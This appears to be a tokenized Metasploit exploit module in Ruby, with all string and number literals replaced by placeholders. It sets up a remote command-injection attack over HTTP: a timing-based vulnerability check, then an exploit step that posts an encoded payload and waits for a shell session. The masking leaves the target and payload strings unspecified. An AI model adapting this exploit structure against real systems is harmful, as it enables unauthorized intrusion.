require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > { <str> = > true , <str> = > <int> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check vprint_status ( <str> ) vprint_status ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) start = Time . now data = <str> ; res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > data , <str> = > { <str> = > <str> , } } , <int> ) elapsed = Time . now - start if elapsed > = <int> return Exploit :: CheckCode :: Vulnerable end return Exploit :: CheckCode :: Safe end def exploit print_status ( <str> rhost <str> rport <str> datastore [ <str> ] <str> ) data = <str> + payload . encoded + <str> ; res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > data , <str> = > { <str> = > <str> , } } , <int> ) if ( not res ) if session_created? print_status ( <str> ) else print_error ( <str> ) end return end end end 
